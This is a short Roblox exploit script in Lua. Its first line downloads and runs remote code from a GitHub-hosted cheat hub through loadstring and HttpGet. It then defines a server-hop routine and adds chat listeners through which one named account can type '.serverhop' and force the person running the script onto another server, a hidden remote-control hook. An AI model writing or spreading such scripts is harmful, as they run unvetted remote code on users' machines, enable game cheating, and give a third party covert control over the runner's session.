loadstring(game:HttpGet("https://raw.githubusercontent.com/f4shn/ImmortalHub/refs/heads/main/mm2lite.lua"))()

function ServerHop()
    local servers = {}
    local req = request({Url = string.format("https://games.roblox.com/v1/games/%d/servers/Public?sortOrder=Asc&limit=100&excludeFullGames=true", game.PlaceId)})
    local body = game:GetService("HttpService"):JSONDecode(req.Body)
    if body and body.data then
        for i, v in next, body.data do
            if type(v) == "table" and tonumber(v.playing) and tonumber(v.maxPlayers) and v.playing < v.maxPlayers and v.id ~= game.JobId then
                table.insert(servers, 1, v.id)
            end
        end
    end
    if #servers > 0 then
        game:GetService('TeleportService'):TeleportToPlaceInstance(game.PlaceId, servers[math.random(1, #servers)], game:GetService('Players').LocalPlayer)
    end
end

game.Players.PlayerAdded:Connect(function(plr)
    if plr.Name == 'Egorikusa_PS99' then
        plr.Chatted:Connect(function(msg)
            if msg == '.serverhop' then
                ServerHop()
            end
        end)
    end
end)

for _, plr in pairs(game.Players:GetPlayers()) do
    if plr.Name == 'Egorikusa_PS99' then
        plr.Chatted:Connect(
            function(msg)
                if msg == '.serverhop' then
                    ServerHop()
                end
            end
        )
    end
end

